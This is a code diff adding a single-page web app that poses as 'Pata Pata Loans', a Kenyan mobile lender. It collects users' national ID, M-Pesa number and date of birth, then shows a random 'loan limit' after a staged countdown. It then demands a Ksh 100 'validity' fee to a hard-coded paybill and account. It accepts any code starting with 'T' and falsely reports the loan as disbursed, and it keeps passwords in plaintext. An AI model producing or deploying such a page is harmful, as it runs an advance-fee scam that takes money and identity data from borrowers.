@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pata Pata Loans</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background: aqua;
+      border: show;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    #app {
+      width: 100%;
+      max-width: 400px;
+      color: #4ECDC4;
+      border: show;
+      height: 100%;
+      background: #2E3A47;
+      padding: 20px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      overflow-y: auto;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    label {
+      font-weight: bold;
+      display: block;
+      margin: 10px 0 5px;
+    }
+
+    input, textarea {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    button {
+      width: 20%;
+      padding: 10px;
+      background-color: #16A085;
+      color: #34495E;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 20px;
+    }
+
+    button:hover {
+      background-color: #45a049;
+    }
+
+    .green-circle {
+      width: 160px;
+      height: 160px;
+      background-color: white;
+      border:show;
+      border: 2px green;
+      color: orange;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 28px;
+      font-weight: bold;
+      margin: 20px auto;
+    }
+
+    .timer {
+      position: relative;
+      height: 200px;
+      width: 200px;
+      margin: 20px auto;
+      color:white;
+      border: 3px aqua;
+      border-radius: 50%;
+      background: conic-gradient(#4caf50 0%, #ccc 0%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .timer span {
+      position: absolute;
+      font-size: 26px;
+      font-weight: bold;
+      color: #333;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .copy-btn {
+      margin-top: 10px;
+      width: 30%;
+      background-color: #007bff;
+    }
+
+    .copy-btn:hover {
+      background-color: green;
+    }
+  </style>
+</head>
+<body>
+  <div id="app"></div>
+
+  <script>
+    const app = document.getElementById("app");
+
+    // Utility functions
+    const saveToLocalStorage = (key, value) => localStorage.setItem(key, JSON.stringify(value));
+    const getFromLocalStorage = (key) => JSON.parse(localStorage.getItem(key));
+
+    // User data and state
+    let currentUser = getFromLocalStorage("currentUser") || null;
+    let loanDetails = getFromLocalStorage("loanDetails") || null;
+
+    // Pages
+    const renderLoginPage = () => {
+      app.innerHTML = `
+        <h2>PATA PATA LOANS</h2>
+        <h2>Login</h2>
+        <label for="login-username">Username</label>
+        <input id="login-username" type="text" placeholder="Enter Username">
+        <label for="login-password">Password</label>
+        <input id="login-password" type="password" placeholder="Enter Password">
+        <button onclick="login()">Login</button>
+        <p style="text-align: center;">Don't have an account? <a href="#" onclick="renderRegisterPage()">Register</a></p>
+      `;
+    };
+
+    const renderRegisterPage = () => {
+      app.innerHTML = `
+        <h2>PATA PATA LOANS</h2>
+        <h2>Register</h2>
+        <label for="register-username">Username</label>
+        <input id="register-username" type="text" placeholder="Enter Username">
+        <label for="register-password">Password</label>
+        <input id="register-password" type="password" placeholder="Enter Password">
+        <button onclick="register()">Register</button>
+        <p style="text-align: center;">Already have an account? <a href="#" onclick="renderLoginPage()">Login</a></p>
+      `;
+    };
+
+    const register = () => {
+      const username = document.getElementById("register-username").value;
+      const password = document.getElementById("register-password").value;
+
+      if (!username || !password) {
+        alert("Please fill all fields to register.");
+        return;
+      }
+
+      const users = getFromLocalStorage("users") || [];
+      users.push({ username, password });
+      saveToLocalStorage("users", users);
+
+      alert("Registration successful! Please log in.");
+      renderLoginPage();
+    };
+
+    const login = () => {
+      const username = document.getElementById("login-username").value;
+      const password = document.getElementById("login-password").value;
+
+      const users = getFromLocalStorage("users");
+
+      if (!users || !users.some((user) => user.username === username && user.password === password)) {
+        alert("Invalid username or password. Please try again.");
+        return;
+      }
+
+      currentUser = username;
+      saveToLocalStorage("currentUser", currentUser);
+      alert("Login successful!");
+      renderWelcomePage();
+    };
+
+    const renderWelcomePage = () => {
+      app.innerHTML = `
+        <h2>Welcome to Pata Pata Loans</h2>
+        <br></br>
+        
+        <button onclick="renderTermsPage()">Next</button>
+      `;
+    };
+
+    const renderTermsPage = () => {
+      app.innerHTML = `
+        <h2>Terms and Conditions</h2>
+        <p>Please read and accept the terms and conditions to proceed.</p>
+        <br/></br/>
+        <p>Pata Pata Loans offers flexible loan terms with competitive interest rates. Repayment periods range from 1 to 12 months, with no hidden fees. Loans are approved quickly, and funds are disbursed directly to your account. Borrowers must provide valid identification and proof of income for approval.
+
+</p>
+        <input id="terms-checkbox" type="checkbox"> I Agree
+        <button onclick="acceptTerms()">Next</button>
+      `;
+    };
+
+    const acceptTerms = () => {
+      const termsCheckbox = document.getElementById("terms-checkbox");
+      if (!termsCheckbox.checked) {
+        alert("You must agree to the terms and conditions to proceed.");
+        return;
+      }
+      renderDetailsPage();
+    };
+
+    const renderDetailsPage = () => {
+      app.innerHTML = `
+        <h2>Enter Your Details</h2>
+        <label for="national-id">National ID</label>
+        <input id="national-id" type="text" placeholder="Enter National ID">
+        <label for="mpesa-number">M-Pesa Number</label>
+        <input id="mpesa-number" type="text" placeholder="Enter M-Pesa Number">
+        <label for="dob">Date of Birth</label>
+        <input id="dob" type="date">
+        <label for="other-phone">Other Phone Number (Optional)</label>
+        <input id="other-phone" type="text" placeholder="Enter Other Phone Number">
+        <p>Do you have overdue loans?</p>
+        <input type="radio" name="overdue-loans" value="Yes"> Yes
+        <input type="radio" name="overdue-loans" value="No"> No
+        <button onclick="submitDetails()">Next</button>
+      `;
+    };
+
+    const submitDetails = () => {
+      const nationalId = document.getElementById("national-id").value;
+      const mpesaNumber = document.getElementById("mpesa-number").value;
+      const dob = document.getElementById("dob").value;
+
+      if (!nationalId || !mpesaNumber || !dob) {
+        alert("Please fill all required fields.");
+        return;
+      }
+
+      const overdueLoans = document.querySelector('input[name="overdue-loans"]:checked');
+      if (!overdueLoans) {
+        alert("Please select whether you have overdue loans.");
+        return;
+      }
+
+      saveToLocalStorage("userDetails", { nationalId, mpesaNumber, dob, overdueLoans: overdueLoans.value });
+      renderLoanPurposePage();
+    };
+
+    const renderLoanPurposePage = () => {
+      app.innerHTML = `
+        <h2>Purpose for Loan</h2>
+        <textarea id="loan-purpose" placeholder="Explain in at least 10 words"></textarea>
+        <button onclick="submitPurpose()">Next</button>
+      `;
+    };
+
+    const submitPurpose = () => {
+      const loanPurpose = document.getElementById("loan-purpose").value.trim();
+      if (loanPurpose.split(" ").length < 10) {
+        alert("Please provide a purpose with at least 10 words.");
+        return;
+      }
+
+      saveToLocalStorage("loanPurpose", loanPurpose);
+      renderOfferPage();
+    };
+
+    const renderOfferPage = () => {
+      let seconds = 30;
+      app.innerHTML = `
+        <h2>Generating Loan Offer</h2>
+        <div class="timer" id="timer">
+          <span id="countdown">${seconds}</span>
+        </div>
+      `;
+
+      const timer = document.getElementById("timer");
+      const countdown = document.getElementById("countdown");
+      let progress = 0;
+
+      const interval = setInterval(() => {
+        progress += 3.33; // 3.33% per second for 30 seconds
+        seconds--;
+        countdown.innerText = seconds;
+        timer.style.background = `conic-gradient(#4caf50 ${progress}%, #ccc 0%)`;
+
+        if (seconds === 0) {
+          clearInterval(interval);
+          const amount = Math.floor(Math.random() * (3000 - 500 + 1)) + 500;
+          loanDetails = { amount, repayAmount: amount * 1.62 };
+          saveToLocalStorage("loanDetails", loanDetails);
+          renderOfferDetailsPage(amount);
+        }
+      }, 1000);
+    };
+
+    const renderOfferDetailsPage = (amount) => {
+      app.innerHTML = `
+        <h2>YOUR LOAN LIMIT IS </h2>
+        <div class="green-circle">${amount} Ksh</div>
+        <button onclick="revealPaymentDetails()">Apply</button>
+        <br></br>
+        <div id="payment-details" class="hidden">
+          <p>To proceed,we consider a customer to make a payment of ksh 100 for validity.</p>
+          <br></br>
+          <p>Paybill: <span id="paybill">700201</span> <button class="copy-btn" onclick="copyText('paybill')">Copy</button></p>
+          <p>Account: <span id="account">6560090271</span> <button class="copy-btn" onclick="copyText('account')">Copy</button></p>
+          <button onclick="renderVerifyPage()">Verify</button>
+        </div>
+      `;
+    };
+
+    const revealPaymentDetails = () => {
+      document.getElementById("payment-details").classList.remove("hidden");
+    };
+
+    const copyText = (id) => {
+      const text = document.getElementById(id).innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        alert(`${text} copied!`);
+      });
+    };
+
+    const renderVerifyPage = () => {
+      app.innerHTML = `
+        <h2>Enter M-Pesa Transaction Code</h2>
+        <input id="transaction-code" type="text" placeholder="Transaction Code">
+        <button onclick="verifyCode()">Verify</button>
+      `;
+    };
+
+    const verifyCode = () => {
+      const transactionCode = document.getElementById("transaction-code").value;
+      if (!transactionCode.startsWith("T")) {
+        alert("Invalid transaction code.");
+        return;
+      }
+
+      renderDisbursementPage();
+    };
+
+    const renderDisbursementPage = () => {
+      app.innerHTML = `
+        <h2>Loan Disbursement</h2>
+        <label for="disbursement-number">M-Pesa Number</label>
+        <input id="disbursement-number" type="text" placeholder="Enter M-Pesa Number">
+        <button onclick="submitDisbursement()">Submit</button>
+      `;
+    };
+
+    const submitDisbursement = () => {
+      const disbursementNumber = document.getElementById("disbursement-number").value;
+      if (!disbursementNumber) {
+        alert("Please enter the M-Pesa number for disbursement.");
+        return;
+      }
+
+      alert("Loan disbursed successfully!");
+      renderDeptPage();
+    };
+
+    const renderDeptPage = () => {
+      app.innerHTML = `
+        <h2>Your Loan Debt</h2>
+        <div class="green-circle">${loanDetails.repayAmount.toFixed(2)} Ksh</div>
+        <p>YOUR LOAN DISBURSEMENT IS PROCESSING THIS TAKES PLACE UNDER 24HRS</p>
+        <br></br>
+        <p style="text-align: center;">This is the total amount you need to repay.</p>
+        <p>Due after 1 month</p>
+      
+      `;
+    };
+
+    // Initialize app
+  if (currentUser && loanDetails) {
+  renderDeptPage();
+   }
+    else if (currentUser) {
+      renderWelcomePage();
+    } else {
+      renderLoginPage();
+    }
+  </script>
+</body>
+  </html>
